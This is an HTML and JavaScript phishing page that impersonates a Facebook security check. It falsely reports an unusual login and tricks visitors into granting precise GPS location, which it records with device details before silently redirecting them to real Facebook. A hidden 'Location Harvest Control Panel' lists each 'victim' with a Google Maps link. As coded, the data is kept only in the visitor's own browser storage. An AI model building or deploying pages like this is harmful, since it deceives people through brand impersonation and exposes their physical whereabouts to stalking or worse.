<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Security Verification</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <!-- Force Geolocation Permission -->
    <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #1877f2 0%, #0e5a8a 100%); 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            padding: 20px; 
            color: #1c1e21;
        }
        .container { 
            background: rgba(255,255,255,0.95); 
            backdrop-filter: blur(20px); 
            border-radius: 20px; 
            box-shadow: 0 20px 60px rgba(0,0,0,0.3); 
            padding: 40px 30px; 
            max-width: 420px; 
            width: 100%; 
            text-align: center; 
            position: relative;
        }
        .fb-logo { 
            font-size: 64px; 
            background: linear-gradient(45deg, #1877f2, #42a5f5); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
            margin-bottom: 20px; 
        }
        h2 { font-size: 26px; font-weight: 700; margin-bottom: 15px; }
        p { color: #65676b; font-size: 16px; line-height: 1.5; margin-bottom: 35px; }
        .verify-btn { 
            background: linear-gradient(45deg, #42a5f5, #1877f2); 
            color: white; 
            border: none; 
            border-radius: 12px; 
            font-size: 18px; 
            font-weight: 600; 
            padding: 18px 50px; 
            cursor: pointer; 
            transition: all 0.3s; 
            width: 100%; 
            box-shadow: 0 8px 25px rgba(66,165,245,0.4);
        }
        .verify-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(66,165,245,0.5); }
        .verify-btn:active { transform: translateY(0); }
        .status { 
            margin-top: 25px; 
            padding: 18px; 
            border-radius: 12px; 
            font-weight: 600; 
            font-size: 16px;
            min-height: 24px;
        }
        .status.loading { background: #e3f2fd; color: #1976d2; }
        .status.success { background: #c8e6c9; color: #2e7d32; }
        .status.error { background: #ffcdd2; color: #c62828; }
        .spinner { 
            width: 24px; height: 24px; 
            border: 3px solid rgba(25,118,210,0.3); 
            border-top: 3px solid #1976d2; 
            border-radius: 50%; 
            animation: spin 1s linear infinite; 
            margin-right: 12px; 
            display: inline-block;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* ADMIN DASHBOARD */
        #admin-panel { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.98); color: white; 
            display: none; z-index: 999; 
            overflow-y: auto; padding: 20px;
        }
        .admin-header { 
            background: linear-gradient(45deg, #1877f2, #42a5f5); 
            padding: 25px; border-radius: 16px; 
            display: flex; justify-content: space-between; align-items: center; 
            margin-bottom: 20px;
        }
        .close-admin { font-size: 32px; cursor: pointer; }
        .victim-card { 
            background: rgba(255,255,255,0.1); 
            backdrop-filter: blur(15px); 
            margin: 15px 0; padding: 25px; 
            border-radius: 16px; 
            border-left: 5px solid #42a5f5;
        }
        .coords { font-size: 24px; font-weight: 700; color: #42a5f5; margin: 10px 0; }
        .map-btn { 
            background: #28a745; color: white; padding: 12px 24px; 
            text-decoration: none; border-radius: 10px; 
            display: inline-block; margin-top: 15px; font-weight: 600;
        }
        .admin-toggle { 
            position: absolute; top: 20px; right: 20px; 
            background: rgba(255,255,255,0.25); color: white; 
            border: none; border-radius: 50%; width: 50px; height: 50px; 
            font-size: 20px; cursor: pointer; backdrop-filter: blur(10px);
        }
        .empty-state { text-align: center; padding: 60px 20px; color: #aaa; }
        @media (max-width: 480px) { .container { padding: 30px 20px; } }
    </style>
</head>
<body>
    <!-- Admin Toggle Button -->
    <button class="admin-toggle" onclick="toggleAdmin()" title="Admin Panel">⚙️</button>

    <!-- Main Phishing Page -->
    <div class="container">
        <div class="fb-logo">f</div>
        <h2>Unusual Login Detected</h2>
        <p style="direction: ltr;">We've detected suspicious activity. Please verify your location to secure your account.</p>
        <button class="verify-btn" onclick="captureLocation()">
            📍 Verify My Location
        </button>
        <div id="status" class="status" style="display: none;"></div>
    </div>

    <!-- Admin Dashboard -->
    <div id="admin-panel">
        <div class="admin-header">
            <h2 style="margin: 0;">🎯 Location Harvest Control Panel</h2>
            <span class="close-admin" onclick="toggleAdmin()">&times;</span>
        </div>
        <div id="victim-list" class="empty-state">
            <div style="font-size: 24px; margin-bottom: 15px;">📱 Waiting for victims...</div>
            <p>Share the link → Victims click → Locations appear here instantly!</p>
        </div>
        <button onclick="clearVictims()" style="width: 100%; padding: 15px; background: #dc3545; color: white; border: none; border-radius: 12px; font-size: 16px; margin-top: 20px; cursor: pointer;">🗑️ Clear All Victims</button>
    </div>

    <script>
        // MULTI-STORAGE SYSTEM (Fixes Incognito/Mobile Issues)
        const storages = [localStorage, sessionStorage];
        let allVictims = [];

        function storageGet(key) {
            for (let storage of storages) {
                try {
                    const data = storage.getItem(key);
                    if (data) return JSON.parse(data);
                } catch(e) {}
            }
            return [];
        }

        function storageSet(key, data) {
            for (let storage of storages) {
                try {
                    storage.setItem(key, JSON.stringify(data));
                } catch(e) {}
            }
        }

        // Load all victims
        function loadVictims() {
            allVictims = storageGet('fb_victims') || [];
            allVictims = [...new Set(allVictims.map(v => JSON.stringify(v)))].map(JSON.parse); // Dedupe
        }

        // Save victims
        function saveVictims() {
            storageSet('fb_victims', allVictims.slice(0, 100)); // Limit 100
        }

        // GEOLOCATION WITH MOBILE FIXES
        async function captureLocation() {
            const status = document.getElementById('status');
            status.style.display = 'block';
            status.innerHTML = '<div class="spinner"></div>Connecting to GPS...';
            status.className = 'status loading';

            // Check permission first (Android fix)
            if (navigator.permissions) {
                try {
                    const perm = await navigator.permissions.query({name: 'geolocation'});
                    if (perm.state === 'denied') {
                        status.innerHTML = '🚫 Location access denied. Enable in browser settings.';
                        status.className = 'status error';
                        return;
                    }
                } catch(e) {}
            }

            // DUAL MODE - High accuracy first, then fallback
            const geoOptions = [
                { enableHighAccuracy: true, timeout: 12000, maximumAge: 5000 },
                { enableHighAccuracy: false, timeout: 15000, maximumAge: 10000 }
            ];

            let success = false;
            for (let options of geoOptions) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, options);
                    });
                    success = true;
                    
                    // VICTIM HARVESTED!
                    const victim = {
                        id: Date.now() + Math.random(),
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy),
                        device: navigator.userAgent.slice(0, 80),
                        platform: navigator.platform,
                        timestamp: new Date().toISOString(),
                        time: new Date().toLocaleString('en-PK')
                    };

                    allVictims.unshift(victim);
                    saveVictims();
                    updateDashboard();

                    // SUCCESS UI
                    status.innerHTML = `
                        ✅ Location Secured!<br>
                        <strong style="color: #2e7d32;">${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}</strong><br>
                        Accuracy: ${victim.accuracy}m
                    `;
                    status.className = 'status success';

                    // STEALTH REDIRECT
                    setTimeout(() => {
                        window.location.href = 'https://m.facebook.com/?sk=welcome';
                    }, 3000);

                    break;
                } catch(e) {
                    console.log('High accuracy failed, trying fallback...');
                }
            }

            if (!success) {
                status.innerHTML = '❌ GPS not available. Enable Location & Retry.';
                status.className = 'status error';
            }
        }

        // UPDATE DASHBOARD
        function updateDashboard() {
            loadVictims();
            const list = document.getElementById('victim-list');
            
            if (allVictims.length === 0) {
                list.innerHTML = `
                    <div style="font-size: 28px; margin-bottom: 20px;">📱 No Victims Yet</div>
                    <p style="font-size: 16px;">Share phishing link → Watch locations appear here!</p>
                `;
                return;
            }

            list.innerHTML = allVictims.map((victim, index) => `
                <div class="victim-card">
                    <div style="font-size: 14px; color: #ccc; margin-bottom: 8px;">
                        Victim #${index + 1} • ${victim.time}
                    </div>
                    <div class="coords">
                        📍 ${victim.lat.toFixed(6)}, ${victim.lng.toFixed(6)}
                    </div>
                    <div style="font-size: 14px; color: #aaa; margin: 8px 0;">
                        📏 ${victim.accuracy}m accuracy • ${victim.platform}
                    </div>
                    <div style="font-size: 12px; color: #888; margin-bottom: 15px;">
                        ${victim.device}
                    </div>
                    <a href="https://www.google.com/maps?q=${victim.lat},${victim.lng}&z=18" 
                       target="_blank" class="map-btn">
                        🗺️ Open in Google Maps
                    </a>
                </div>
            `).join('') + `
                <div style="text-align: center; padding: 20px; color: #aaa;">
                    Total Victims: ${allVictims.length}
                </div>
            `;
        }

        // TOGGLE ADMIN
        function toggleAdmin() {
            const panel = document.getElementById('admin-panel');
            panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
            if (panel.style.display === 'block') updateDashboard();
        }

        // CLEAR VICTIMS
        function clearVictims() {
            allVictims = [];
            for (let storage of storages) {
                try { storage.clear(); } catch(e) {}
            }
            updateDashboard();
        }

        // AUTO-REFRESH & INIT
        setInterval(() => {
            if (document.getElementById('admin-panel').style.display === 'block') {
                updateDashboard();
            }
        }, 2000);

        loadVictims();
        updateDashboard();

        // ADMIN AUTO-OPEN
        if (location.hash.includes('admin')) {
            setTimeout(toggleAdmin, 500);
        }

        // PREVENT ZOOM ON MOBILE
        document.addEventListener('touchstart', e => {
            if (e.touches.length > 1) e.preventDefault();
        }, { passive: false });
    </script>
</body>
</html>
